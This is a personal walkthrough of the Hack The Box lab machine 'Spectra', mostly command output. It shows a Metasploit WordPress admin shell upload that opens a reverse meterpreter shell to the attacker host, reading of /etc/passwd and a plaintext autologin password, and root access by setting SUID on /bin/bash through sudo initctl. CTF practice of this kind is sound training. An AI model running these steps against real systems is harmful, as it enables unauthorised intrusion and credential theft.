We can try bruteforcing Wordpress

We already logged in (see:[[Website]])

```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   devteam01        yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.229     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /main            yes       The base path to the wordpress application
   USERNAME   administrator    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(unix/webapp/wp_admin_shell_upload) > set vhost spectra.htb
vhost => spectra.htb
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.10.16.193:4444 
[*] Authenticating with WordPress using administrator:devteam01...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /main/wp-content/plugins/GSTeAjMkdV/HcdrbHlhKL.php...
[*] Sending stage (39282 bytes) to 10.10.10.229
[+] Deleted HcdrbHlhKL.php
[+] Deleted GSTeAjMkdV.php
[+] Deleted ../GSTeAjMkdV
[*] Meterpreter session 1 opened (10.10.16.193:4444 -> 10.10.10.229:40898) at 2021-05-18 21:45:21 -0400

```

We got a shell :D

meterpreter > getuid
Server username: nginx (20155)

meterpreter > sysinfo
Computer    : spectra
OS          : Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64
Meterpreter : php/linux

`cat /etc/passwd`
nginx:x:20155:20156::/home/nginx:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
root:x:0:0:root:/root:/bin/bash

`cd /opt`
`ls`
VirtualBox
autologin.conf.orig < let's see what's in the [[config]] file
there's a password file in `/etc/autologin`

cd /etc/autologin
ls
passwd
cat passwd
SummerHereWeCome!!

^^^^^ For Katie - `su katie`

since we cant get a terminal, let's SSH instead

katie@10.10.10.229

â”Œâ”€â”€(rootðŸ’€kali)-[/media/â€¦/HTB/Boxes/Active Boxes/Spectra]
â””â”€# ssh katie@10.10.10.229         
The authenticity of host '10.10.10.229 (10.10.10.229)' can't be established.
RSA key fingerprint is SHA256:lr0h4CP6ugF2C5Yb0HuPxti8gsG+3UY5/wKjhnjGzLs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.229' (RSA) to the list of known hosts.
Password: 
katie@spectra ~ $ ls
log  user.txt
katie@spectra ~ $ cat user.txt
e89d27fe195e9114ffa72ba8913a6130

there's our first [[Flag]]

katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
(ALL) SETENV: NOPASSWD: /sbin/initctl

https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9

let's edit the file and add;

script
chmod +s /bin/bash
end script

katie@spectra /etc/init $ sudo -u root /sbin/initctl list
long list here lol
katie@spectra /etc/init $ sudo /sbin/initctl start test
test start/running, process 8652
katie@spectra /etc/init $ /bin/bash -p
bash-4.3# id
uid=20156(katie) gid=20157(katie) euid=0(root) egid=0(root) groups=0(root),20157(katie),20158(developers)
bash-4.3# cd /root 
bash-4.3# ls
main  nodetest.js  root.txt  script.sh  startup  test.conf
bash-4.3# cat root.txt
d44519713b889d5e1f9e536d0c6df2fc

[[Shadow]]